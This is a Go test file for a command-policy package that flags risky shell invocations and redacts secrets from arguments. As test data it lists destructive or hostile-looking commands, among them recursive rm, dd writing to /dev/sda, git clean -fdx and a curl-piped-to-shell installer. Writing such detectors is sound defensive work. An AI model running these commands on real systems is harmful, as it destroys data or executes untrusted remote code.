package commandpolicy

import (
	"reflect"
	"testing"
)

func TestInspect(t *testing.T) {
	tests := []struct {
		name      string
		argv      []string
		dangerous bool
	}{
		{name: "ordinary", argv: []string{"go", "test", "./..."}},
		{name: "recursive remove", argv: []string{"rm", "-rf", "build"}, dangerous: true},
		{name: "nonrecursive remove", argv: []string{"rm", "file.txt"}},
		{name: "privilege escalation", argv: []string{"sudo", "go", "test"}, dangerous: true},
		{name: "device write", argv: []string{"dd", "if=image", "of=/dev/sda"}, dangerous: true},
		{name: "regular dd", argv: []string{"dd", "if=input", "of=output"}},
		{name: "shell removal", argv: []string{"sh", "-c", "echo start; rm -r output"}, dangerous: true},
		{name: "download shell", argv: []string{"bash", "-c", "curl https://example.test/install | sh"}, dangerous: true},
		{name: "forced git clean", argv: []string{"git", "clean", "-fdx"}, dangerous: true},
		{name: "env wrapped removal", argv: []string{"env", "LC_ALL=C", "rm", "-rf", "build"}, dangerous: true},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			decision := Inspect(test.argv)
			if decision.Dangerous != test.dangerous {
				t.Fatalf("Inspect(%q) = %#v", test.argv, decision)
			}
			if decision.Dangerous && decision.Reason == "" {
				t.Fatal("dangerous decision has no reason")
			}
		})
	}
}

func TestRedact(t *testing.T) {
	argv := []string{
		"tool",
		"--token", "plain",
		"--api-key=value",
		"DATABASE_PASSWORD=hunter2",
		"--name", "visible",
	}
	want := []string{
		"tool",
		"--token", "<redacted>",
		"--api-key=<redacted>",
		"DATABASE_PASSWORD=<redacted>",
		"--name", "visible",
	}

	got := Redact(argv)
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("Redact() = %#v, want %#v", got, want)
	}
	if argv[2] != "plain" {
		t.Fatal("Redact mutated its input")
	}
}
